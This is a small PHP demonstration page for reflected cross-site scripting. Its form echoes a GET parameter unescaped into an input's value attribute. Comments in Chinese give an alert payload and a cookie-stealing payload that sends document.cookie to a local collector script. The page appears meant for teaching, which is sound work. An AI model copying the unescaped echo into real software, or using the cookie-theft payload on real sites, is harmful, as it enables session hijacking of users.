<?php
//(1)输入下面的字符串，黑客可以搜集cookie     "/> <script>window.open("http://127.0.0.1:82/web_security/web_xss_haker.php?cookie="+document.cookie);</script><!-- 
//(2)输入  "/><script>alert(111)</script><!--   跳出弹框
session_start();  
?>

<!doctype html>  
<html>  
    <head>  
        <title>XSS demo</title>  
    </head>  
    <body>  
    <form>  
    <input style="width:300px;" type="text" name="address1" value="<?php echo $_GET["address1"]; ?>" />  
            <input type="submit" value="Submit" />  
        </form>  
    </body>  
</html>  